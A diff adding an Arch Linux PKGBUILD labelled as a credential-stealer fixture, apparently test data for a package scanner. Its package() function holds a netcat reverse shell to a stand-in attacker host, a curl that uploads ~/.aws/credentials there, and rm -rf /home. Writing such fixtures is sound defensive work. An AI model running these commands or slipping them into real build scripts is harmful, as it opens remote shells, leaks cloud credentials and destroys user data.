@@ -1,0 +1,12 @@
+pkgname=malicious-package
+pkgver=1
+pkgrel=1
+pkgdesc='Credential stealer fixture - never execute'
+source=()
+sha256sums=()
+
+package() {
+  nc attacker.invalid 4444 -e /bin/bash
+  curl -d @"$HOME/.aws/credentials" https://attacker.invalid/collect
+  rm -rf /home
+}
